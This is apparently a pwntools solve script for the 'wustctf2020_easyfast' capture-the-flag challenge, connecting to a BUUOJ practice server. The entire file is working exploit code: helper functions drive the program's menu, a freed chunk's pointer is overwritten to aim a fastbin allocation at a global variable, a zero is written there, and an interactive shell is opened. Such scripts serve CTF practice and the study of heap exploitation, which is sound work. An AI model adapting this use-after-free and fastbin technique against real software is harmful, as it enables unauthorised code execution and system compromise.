from pwn import *

p = remote('node4.buuoj.cn', 25728)
#p = process('./wustctf2020_easyfast')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + '\n' + s)

def alloc(size):
    p.sendlineafter(b'choice>', b'1')
    p.sendlineafter(b'size>\n', str(size).encode())

def delete(index):
    p.sendlineafter(b'choice>', b'2')
    p.sendlineafter(b'index>\n', str(index).encode())
    
def edit(index, content):
    p.sendlineafter(b'choice>', b'3')
    p.sendlineafter(b'index>\n', str(index).encode())
    p.send(content)
    
def shell():
    p.sendlineafter(b'choice>', b'4')
    p.interactive()

flag = 0x602090

alloc(0x40) #0
delete(0)
edit(0, p64(flag - 0x10))
alloc(0x40) #1
alloc(0x40) #2
edit(2, p64(0))

shell()